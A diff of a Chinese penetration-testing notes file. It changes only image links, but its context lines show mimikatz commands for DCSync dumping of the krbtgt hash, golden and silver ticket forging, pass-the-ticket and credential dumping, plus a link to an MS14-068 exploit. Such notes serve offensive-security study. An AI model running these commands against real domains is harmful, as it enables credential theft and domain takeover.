@@ -10,26 +10,26 @@
 	域内机器：sub2k8.zone.com
 	域内普通用户：y
 	域内机器是不能访问dc上的文件
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/390.png)
+![image](img/390.png)
 
 	清空票据
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/391.png)
+![image](img/391.png)
 
 	域控中获取krbtgt用户的信息
 	>privilege::debug
 	>mimikatz log "lsadump::dcsync /domain:zone.com /user:krbtgt"
 	获取信息：/domain、/sid、/aes256
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/392.png)
+![image](img/392.png)
 
 	在sub2k8中生成golden ticket
 	>mimikatz "kerberos::golden /krbtgt:{ntlmhash} /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi"
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/393.png)
+![image](img/393.png)
 
 	导入
 	Mimikatz#kerberos::ptt 123.kirbi
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/394.png)
+![image](img/394.png)
   ### 白银票据+Mimikatz
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/395.png)
+![image](img/395.png)
 
 	Silver Ticket是伪造的TGS，只能访问指定服务权限
 	域控：dc.zone.com
@@ -38,11 +38,11 @@
 	域控中导出
 	>privilege::debug
 	>sekurlsa::logonpasswords
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/396.png)
+![image](img/396.png)
 
 	Sub2k8伪造票据
 	>mimikatz "kerberos::golden /domain:zone.com /sid:{SID} /target:dc.zone.com /service:cifs /rc4:{NTLM} /user:y /ptt"
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/397.png)
+![image](img/397.png)
   ### MS14-068
   #### 第一种
 	https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
